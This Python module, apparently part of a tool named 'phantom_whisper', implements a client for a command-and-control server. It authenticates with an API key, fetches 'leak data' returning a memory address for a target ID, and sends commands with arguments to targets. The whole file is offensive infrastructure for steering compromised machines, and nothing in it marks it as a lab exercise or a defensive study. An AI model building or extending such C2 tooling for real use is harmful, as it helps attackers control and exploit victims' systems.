# phantom_whisper/c2_client.py
import requests
import json
from typing import Optional, Dict, Any
from requests.adapters import HTTPAdapter 
from urllib3.util.retry import Retry 
from .exceptions import C2Error, C2ResponseSchemaError, C2RequestFailed 
from .config import settings 
import logging

logger = logging.getLogger(__name__)

class C2Client:
    """Handles communication with the Command and Control (C2) server."""
    
    def __init__(self, base_url: str, api_key: str): # api_key is now a plain string
        self.base_url = base_url
        self.session = requests.Session() 

        # Configure retry strategy for GET requests (idempotent)
        retry_strategy = Retry(
            total=3, 
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=frozenset(["GET"]) # Corrected for urllib3 compatibility
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        self.session.mount("https://", adapter)
        self.session.mount("http://", adapter)

        # Set headers for the session
        self.session.headers.update({
            "X-API-Key": api_key, 
            "Content-Type": "application/json"
        })
        
        self.timeout_seconds = settings.c2_request_timeout_sec # Store timeout locally
        logger.info(f"C2 Client initialized for base URL: {base_url}")

    def _validate_c2_response(self, response_data: Dict[str, Any], expected_status: str = "success", require_address: bool = False) -> None:
        """Helper to validate common C2 response schema."""
        if not isinstance(response_data, dict):
            raise C2ResponseSchemaError("C2 response is not a JSON object.")
        
        status = response_data.get("status")
        if status != expected_status:
            raise C2ResponseSchemaError(f"C2 reported status '{status}'. Expected '{expected_status}'. "
                                        f"Message: {response_data.get('message', 'N/A')}. Full response: {json.dumps(response_data)}")
        
        # This check is crucial and specific to leak data queries, only applied if require_address is True
        if require_address and expected_status == "success" and "address" not in response_data:
            raise C2ResponseSchemaError(f"Success status received, but 'address' field missing in C2 response for leak data. Full response: {json.dumps(response_data)}")


    def query_leak_data(self, target_id: str) -> Optional[str]:
        endpoint = f"{self.base_url}/leak_data/{target_id}"
        try:
            response = self.session.get(endpoint, timeout=self.timeout_seconds)
            response.raise_for_status() 
            
            try:
                leak_data = response.json()
            except json.JSONDecodeError as e:
                raise C2ResponseSchemaError(f"C2 responded with malformed JSON for leak data: {e}. Response: {response.text}")
            
            # Now, _validate_c2_response is called with require_address=True
            self._validate_c2_response(leak_data, expected_status="success", require_address=True)
            
            return leak_data["address"] # 'address' is guaranteed to be present if validation passes
        except requests.exceptions.RequestException as e:
            raise C2RequestFailed(f"Network error querying C2 server for leak data: {e}")
        except C2ResponseSchemaError:
            raise
        except Exception as e:
            raise C2Error(f"Unexpected error querying C2 for leak data: {e}")

    def send_command(self, target_id: str, command: str, args: Dict[str, Any]) -> bool:
        endpoint = f"{self.base_url}/command"
        payload = {
            "target_id": target_id,
            "command": command,
            "arguments": args
        }
        try:
            # POST requests are fire-and-forget for retries at C2 client level
            response = self.session.post(endpoint, json=payload, timeout=self.timeout_seconds)
            response.raise_for_status()

            try:
                c2_response = response.json()
            except json.JSONDecodeError as e:
                raise C2ResponseSchemaError(f"C2 responded with malformed JSON for command ACK: {e}. Response: {response.text}")

            # No 'address' required for command Acks, so require_address=False (default)
            self._validate_c2_response(c2_response, expected_status="success") 
            return True
        except requests.exceptions.RequestException as e:
            raise C2RequestFailed(f"Network error sending command '{command}' to C2: {e}")
        except C2ResponseSchemaError: 
            raise
        except Exception as e:
            raise C2Error(f"Unexpected error sending command '{command}' to C2: {e}")
